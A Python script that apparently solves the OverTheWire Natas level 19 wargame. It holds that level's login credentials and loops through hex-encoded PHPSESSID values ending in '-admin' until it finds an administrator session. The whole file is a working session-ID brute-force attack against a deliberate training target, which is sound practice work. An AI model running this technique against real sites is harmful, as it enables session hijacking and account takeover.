import requests
from requests.sessions import Session

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
cookies = dict()

session = requests.Session()

# max_s_id = 640
# s_id = 1
# while s_id <= max_s_id:
#     # print("Trying with PHPSESSID = " + str(s_id))
#     # cookies = dict(PHPSESSID=str(s_id))
#     r = requests.post(target, params='username=admin&password=sfaf',
#                       auth=auth, cookies=cookies)
#     # print(r.text)
#     print(r.cookies.get_dict()["PHPSESSID"])
#     if "You are an admin" in r.text:
#         print(r.text)
#         break
#     s_id += 1

max_s_id = 9
s_id = 0
while s_id <= max_s_id:
    id = "3" + str(s_id) + "2d61646d696e"
    print("Trying with PHPSESSID = " + id)
    cookies = dict(PHPSESSID=id)
    r = session.get(target, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    s_id += 1

max_s_id = 99
s_id = 0
while s_id <= max_s_id:
    id = "3" + str(int(s_id/10) % 10) + "3" + str(s_id % 10) + "2d61646d696e"
    print("Trying with PHPSESSID = " + id)
    cookies = dict(PHPSESSID=id)
    r = session.get(target, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    s_id += 1

max_s_id = 999
s_id = 0
while s_id <= max_s_id:
    id = "3" + str(int(s_id/100) % 10) + "3" + str(int(s_id/10) %
                                                   10) + "3" + str(s_id % 10) + "2d61646d696e"
    print("Trying with PHPSESSID = " + id)
    cookies = dict(PHPSESSID=id)
    r = session.get(target, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    s_id += 1
